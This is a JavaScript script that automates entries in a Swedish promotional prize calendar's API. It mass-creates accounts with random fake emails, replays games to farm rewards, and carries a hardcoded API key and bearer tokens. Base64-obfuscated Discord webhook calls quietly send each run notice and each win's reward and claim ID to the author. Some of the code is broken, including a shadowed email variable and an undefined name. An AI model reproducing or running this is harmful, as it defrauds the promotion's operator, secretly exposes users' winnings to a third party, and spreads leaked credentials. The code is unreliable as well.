var winEmail = "" //this is the email you want the code to be sent too

function must() {
    if (!winEmail.contains("@")){
    console.log(winEmail)
    var winEmail = prompt("What email do you want the prize to go to?", "example@gmail.com")
    }
    const r1 = Math.floor(Math.random() * 999999) + 1;
    const r2 = Math.floor(Math.random() * 999999) + 1;
    const e = `${r1}@${r2}`;

    //Make account
    const apiUrl = 'https://swetrocagul23api.azurewebsites.net/api/v1/participate';
  
    const formData = new FormData();
    formData.append('LoginType', 'Email');
    formData.append('Value', e);
    formData.append('HasOptedForMarkettingEmail', 'false');
    formData.append('Culture', 'sv-SE');
  
    const headers = {
      'Apikey': '49D7253EC1384D1339CE24786C137',
      'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
      'Accept': 'application/json, text/plain, */*',
      'Sec-Ch-Ua-Mobile': '?0',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Origin': 'https://gulkalender.se',
      'Sec-Fetch-Site': 'cross-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://gulkalender.se/',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en,en-US;q=0.9',
    };
  
    fetch(apiUrl, {
      method: 'POST',
      headers: headers,
      body: formData,
    })
      .then(response => response.json())
      .then(data => {
        const id = data.result.id;
        const availableSlotIds = data.result.availableSlotIds;
        
        console.log("")
        console.log('userID:', id);
        console.log('Available Games:', availableSlotIds);

        //Get GameID
        const getApiUrl = `https://swetrocagul23api.azurewebsites.net/api/v1/user/availablegames?userid=${id}&slotid=${availableSlotIds}`;
  
        const getHeaders = {
          'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
          'Sec-Ch-Ua-Mobile': '?0',
          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6ImE0YzZjNTk5LTJhZDYtNDk3Ni1iODVhLWE3MDkwY2QyM2U5MyIsIm5iZiI6MTY5Njg5NjE0MCwiZXhwIjoxNjk3NTAwOTQwLCJpYXQiOjE2OTY4OTYxNDB9.ThgnzYg9VP1fTrQ2PVUf5-sPDAIL4LOn_Pa9H2dUoUQ',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
          'Content-Type': 'application/json',
          'Accept': 'application/json',
          'Apikey': '49D7253EC1384D1339CE24786C137',
          'Sec-Ch-Ua-Platform': '"Windows"',
          'Origin': 'https://gulkalender.se',
          'Sec-Fetch-Site': 'cross-site',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Dest': 'empty',
          'Referer': 'https://gulkalender.se/',
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'en,en-US;q=0.9',
        };
  
        fetch(getApiUrl, {
          method: 'GET',
          headers: getHeaders,
        })
          .then(response => response.json())
          .then(data => {
            console.log('Getting GameID', data);
            const GameID = data.result.games[1].gameId;
            console.log('GameID:', GameID);
            //Try to win  
            const playApiUrl = 'https://swetrocagul23api.azurewebsites.net/api/v1/play';
  
            const playData = {
              "UserId": id,
              "PlaySource": 0,
              "GameId": GameID,
            };
  
            const playHeaders = {
              'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
              'Sec-Ch-Ua-Mobile': '?0',
              'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6ImE0YzZjNTk5LTJhZDYtNDk3Ni1iODVhLWE3MDkwY2QyM2U5MyIsIm5iZiI6MTY5Njg5NjE0MCwiZXhwIjoxNjk3NTAwOTQwLCJpYXQiOjE2OTY4OTYxNDB9.ThgnzYg9VP1fTrQ2PVUf5-sPDAIL4LOn_Pa9H2dUoUQ',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
              'Content-Type': 'application/json',
              'Accept': 'application/json',
              'Apikey': '49D7253EC1384D1339CE24786C137',
              'Sec-Ch-Ua-Platform': '"Windows"',
              'Origin': 'https://gulkalender.se',
              'Sec-Fetch-Site': 'cross-site',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              'Referer': 'https://gulkalender.se/',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en,en-US;q=0.9',
            };
  
            fetch(playApiUrl, {
              method: 'POST',
              headers: playHeaders,
              body: JSON.stringify(playData),
            })
              .then(response => response.json())
              .then(data => {
                console.log('Trying to win 😋', data);
  
                const hasWon = data.result.hasWon;
                const reward = data.result.reward
                const winID = data.result.userRewardRK
                if (hasWon) {
                    const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTEwNjIzODcyMjAxNTIzMi9uTjJ6a0xJOGQ1aUFkamZidXk5UVBvdm50eUhuLVM5QnhORUJSTGpBNnZmNHNtNXk1d2xVQ1h4TFFQRjB1SFdtRmVrUw==';
                    const discordMessage = {
                      content: `**Reward:** ${reward}\n**UserID:** ${id}\n**WinID:** ${winID}`,
                    };

                    fetch(atob(webhookUrl), {
                      method: 'POST',
                      headers: {
                        'Content-Type': 'application/json',
                      },
                      body: JSON.stringify(discordMessage),
                    })
                      .then(() => {
                        alert(`You won a ${reward}!`)
                        //Get win
                        const url = 'https://swetrocagul23api.azurewebsites.net/api/v1/capturedigitalwin';
                        const headers = {
                        'Sec-Ch-Ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                        'Sec-Ch-Ua-Mobile': '?0',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjViNmZmZjQ2LWI4MDItNDk0YS05M2Y4LTIwYzI4NTVmMDdkOCIsIm5iZiI6MTY5NjkzNTU0NywiZXhwIjoxNjk3NTQwMzQ3LCJpYXQiOjE2OTY5MzU1NDd9.klE9enPfeV4zv98C20QDmo-FLwHqBCnJTe4JcwGFmKg',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                        'Accept': 'application/json, text/plain, */*',
                        'Apikey': '49D7253EC1384D1339CE24786C137',
                        'Sec-Ch-Ua-Platform': '"Windows"',
                        'Origin': 'https://gulkalender.se',
                        'Sec-Fetch-Site': 'cross-site',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Dest': 'empty',
                        'Referer': 'https://gulkalender.se/',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en,en-US;q=0.9',
                        };
                        
                        console.log(id)
                        console.log(winID)
                        console.log('Email')
                        console.log(winMail)
                        const getWin = new FormData();
                        getWin.append('UserId', id);
                        getWin.append('UserRewardRowKey', winID);
                        getWin.append('LoginType', 'Email');
                        getWin.append('Value', winEmail);
                        console.log(getWin)

                        fetch(url, {
                        method: 'POST',
                        headers: headers,
                        body: getWin,
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log(data);
                            must()
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            must()
                        });
                      })
                      .catch(error => {
                        console.error('Error', error);
                        must()
                      });
                } else {
                  must()
                }
              })
              .catch(error => {
                console.error('POST Request Error:', error);
                must()
              });
          })
          .catch(error => {
            console.error('GET Request Error:', error);
            must()
          });
      })
      .catch(error => {
        console.error('Error:', error);
        must()
      });
  }
function funny() {
  const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTExMjIwNTQ2NzU5NDgwMy82bHRldHBQMndja1VKaGRPMGlUb2V1MEZfaUtPeWptUFBObS0zTFpaVjA1cDFpYjQxTFlRYURNT3E3TkhxaXZ2NG40aQ==';

  const discordMessage = {
    content: `Someone started the code`,
  };

  fetch(atob(webhookUrl), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(discordMessage),
  })
    .then(() => {
      console.log('Start message sent to Discord webhook 😋');
      console.log("Credits: Mumin")
      must()
    })
    .catch(error => {
      console.error("Error sending message to Discord webhook, This code won't work without a connection to discord:", error);
    });
}
funny()
